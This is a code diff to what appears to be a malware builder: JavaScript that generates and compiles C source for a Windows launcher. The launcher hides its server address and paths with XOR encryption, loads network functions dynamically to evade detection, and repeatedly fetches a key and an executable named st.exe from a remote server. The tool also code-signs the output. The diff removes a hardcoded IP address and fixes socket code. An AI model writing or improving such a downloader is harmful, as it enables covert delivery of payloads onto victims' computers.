@@ -87,29 +87,12 @@ function cSource(meta, ip, buildId) {
   const encIp = encryptStr(ip, meta.xorKey);
   const encKeyPath = encryptStr(`/api/getkey/${buildId}`, meta.xorKey);
   const encStPath = encryptStr(`/api/downloads/st.exe`, meta.xorKey);
-  const encHost = encryptStr(`95.182.96.216`, meta.xorKey); // Placeholder host for HTTP headers
 
   return String.raw`
 #include <windows.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
-
-// ── structures (defined manually to avoid importing ws2_32 statically) ──────
-typedef UINT_PTR SOCKET;
-#define INVALID_SOCKET (SOCKET)(~0)
-#define SOCKET_ERROR   (-1)
-#define AF_INET        2
-#define SOCK_STREAM    1
-#define SOL_SOCKET     0xffff
-#define SO_RCVTIMEO    0x1006
-
-struct sockaddr_in {
-    short sin_family;
-    unsigned short sin_port;
-    struct { unsigned long s_addr; } sin_addr;
-    char sin_zero[8];
-};
 
 // ── XOR decryption ─────────────────────────────────────────────────────────
 static void decrypt(char* buf, int len, unsigned char key) {
@@ -200,7 +183,7 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     struct sockaddr_in addr = {0};
     addr.sin_family = AF_INET;
     addr.sin_port = htonsFunc(80);
-    addr.sin_addr.s_addr = inetFunc(host);
+    addr.sin_addr.S_un.S_addr = inetFunc(host); // Fixed union access
 
     if (connectFunc(sock, &addr, sizeof(addr)) == SOCKET_ERROR) {
         closeFunc(sock); wsaCleanup(); return 0;
@@ -292,12 +275,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         char ipStr[32]; const char encIp[] = ${encIp};
         char keyPathStr[64]; const char encKeyPath[] = ${encKeyPath};
         char stPathStr[64]; const char encStPath[] = ${encStPath};
-        char hostStr[32]; const char encHost[] = ${encHost};
 
         decrypt(ipStr, sizeof(encIp), ${meta.xorKey});
         decrypt(keyPathStr, sizeof(encKeyPath), ${meta.xorKey});
         decrypt(stPathStr, sizeof(encStPath), ${meta.xorKey});
-        decrypt(hostStr, sizeof(encHost), ${meta.xorKey});
 
         for (int i = 0; i < ${meta.retries} && (need_key || need_st); i++) {
             if (need_key) {
@@ -405,7 +386,7 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
       
       return fs.readFileSync(signedPath);
     } catch (e) {
-      console.warn('[launcher] signing failed (osslsigncode/openssl missing?), returning unsigned', e.message);
+      console.warn('[launcher] signing failed, returning unsigned', e.message);
       return fs.readFileSync(outPath);
     }
 
